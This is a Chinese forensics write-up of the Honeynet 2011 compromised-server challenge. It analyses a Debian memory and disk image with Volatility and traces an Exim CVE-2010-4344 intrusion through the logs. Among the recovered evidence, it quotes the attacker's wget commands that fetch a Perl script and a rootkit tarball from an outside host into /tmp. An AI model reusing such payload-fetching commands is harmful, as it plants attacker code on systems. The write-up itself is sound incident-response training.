---
title: "记一次 Linux 镜像取证"
slug: a-linux-image-forensics
aliases: ["/2020/a-linux-image-forensics.html"]
date: 2020-04-21 12:50:05
categories: ["取证"]
tags: ["取证", "Linux"]
toc: true
draft: false
---

本文首发于 i 春秋：<https://bbs.ichunqiu.com/thread-56889-1-5.html>

题目地址：<http://www.honeynet.org/challenges/2011_7_compromised_server>

使用工具：[volatility](https://github.com/volatilityfoundation/volatility)

查看题目要求

![linux-quzhen-1](https://oss.zjun.info/zjun.info/linux-quzhen-1.webp)

下载这三个镜像并将 `victoria-v8.sda1.img` 挂载到 `/mnt` 目录下

```bash
sudo mount -o loop victoria-v8.sda1.img /mnt
```

在 `/mnt` 目录下可以看见

![linux-quzhen-2](https://oss.zjun.info/zjun.info/linux-quzhen-2.webp)

首先查看系统版本

```bash
cat etc/issue
```

![linux-quzhen-3](https://oss.zjun.info/zjun.info/linux-quzhen-3.webp)

在 `var/log` 目录下查看 `Linux` 的版本

![linux-quzhen-4](https://oss.zjun.info/zjun.info/linux-quzhen-4.webp)

然后制作版本对应的 `profile` ，可自己手动制作，也可以使用 `github` 上制作好的
Github 项目：<https://github.com/volatilityfoundation/profiles>

![linux-quzhen-5](https://oss.zjun.info/zjun.info/linux-quzhen-5.webp)

下载 `debian5010` 解压后放在 `/volatility/plugins/overlays/linux` 目录下

```bash
python vol.py --info
```

![linux-quzhen-6](https://oss.zjun.info/zjun.info/linux-quzhen-6.webp)

现在开始分析镜像文件

```bash
python vol.py -f /home/reder/Desktop/tools/取证/取证镜像/victoria-v8.memdump.img --profile=LinuxDebian5010x86 linux_psaux
```

可以看见以下的输出

![linux-quzhen-7](https://oss.zjun.info/zjun.info/linux-quzhen-7.webp)

我们可以发现一个可疑的 `nc` 连接，连接到 `192.168.56.1` 端口是 `8888`

查看网络信息：

```bash
python vol.py -f /home/reder/Desktop/tools/取证/取证镜像/victoria-v8.memdump.img --profile=LinuxDebian5010x86 linux_netstat
```

![linux-quzhen-8](https://oss.zjun.info/zjun.info/linux-quzhen-8.webp)

```bash
TCP 192.168.56.102:25 192.168.56.101:37202 CLOSE sh/2065
TCP 192.168.56.102:25 192.168.56.101:37202 CLOSE sh/2065
```

有两个已经关闭的连接。

查看 `bash` 记录：

```bash
python vol.py -f /home/reder/Desktop/tools/取证/取证镜像/victoria-v8.memdump.img --profile=LinuxDebian5010x86 linux_bash
```

![linux-quzhen-9](https://oss.zjun.info/zjun.info/linux-quzhen-9.webp)

可以发现复制了 `exim4` 目录下的所有文件，我们切换至 `/mnt/var/log/exim4` 目录下，运行 `su` 后进入，查看 `rejectlog`

```bash
cat rejectlog
```

![linux-quzhen-10](https://oss.zjun.info/zjun.info/linux-quzhen-10.webp)

![linux-quzhen-11](https://oss.zjun.info/zjun.info/linux-quzhen-11.png)

![linux-quzhen-12](https://oss.zjun.info/zjun.info/linux-quzhen-12.webp)

日志显示 `IP`  `192.168.56.101` 作为发送邮件的主机，结合上面已经关闭的连接，基本表明 `192.168.56.101` 是一个攻击 `IP` 。

> wget http://192.168.56.1/c.pl -O /tmp/c.pl
> wget http://192.168.56.1/rk.tar -O /tmp/rk.tar

攻击者下载了 `c.pl` 和 `rk.tar` 两个文件到 `/tmp` 下
查看一下 `c.pl`

![linux-quzhen-13](https://oss.zjun.info/zjun.info/linux-quzhen-13.png)

是一个 `perl` 脚本文件，可以自行审计。

查看日志 `auth.log`

![linux-quzhen-14](https://oss.zjun.info/zjun.info/linux-quzhen-14.webp)

![linux-quzhen-15](https://oss.zjun.info/zjun.info/linux-quzhen-15.png)

可发现攻击者爆破了 `192.168.56.1` 的 `ssh` 密码，但是最终并未成功。

综上可以基本确定攻击者通过 `Exim` 进行攻击的。漏洞编号为 `CVE-2010-4344` 。
